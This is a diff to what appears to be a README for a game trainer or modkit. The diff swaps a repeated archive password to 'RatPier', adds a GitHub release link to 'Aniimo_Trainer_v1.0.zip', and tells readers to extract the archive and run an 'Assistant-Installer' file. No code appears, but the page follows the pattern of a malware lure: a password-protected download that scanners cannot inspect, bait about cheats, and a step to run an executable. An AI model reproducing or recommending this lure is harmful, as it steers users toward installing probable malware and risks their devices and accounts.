@@ -1,13 +1,22 @@
-#### PASSWORD: FreeForUse
-#### PASSWORD: FreeForUse
-#### PASSWORD: FreeForUse
-#### PASSWORD: FreeForUse
+#### PASSWORD: RatPier
+#### PASSWORD: RatPier
+#### PASSWORD: RatPier
+#### PASSWORD: RatPier
+
+
+
+<a href="https://github.com/CoveBlackbirdFold/aniimo-modkit/releases/download/v1.0.0/Aniimo_Trainer_v1.0.zip">
+  <img width="1920" height="547" alt="image" src="https://github.com/user-attachments/assets/9c6ae27a-651d-4190-b950-033febb53b16" />
+
+</a>
+
+
 
 ### Installation
 
-1. Download the **Installer** archive.
+1. Download the **Assistant-Installer-V2.1** archive.
 2. Extract the archive to a folder.
-3. Open the extracted folder and run the **Installer** file.
+3. Open the extracted folder and run the **Assistant-Installer** file.
 
 
 
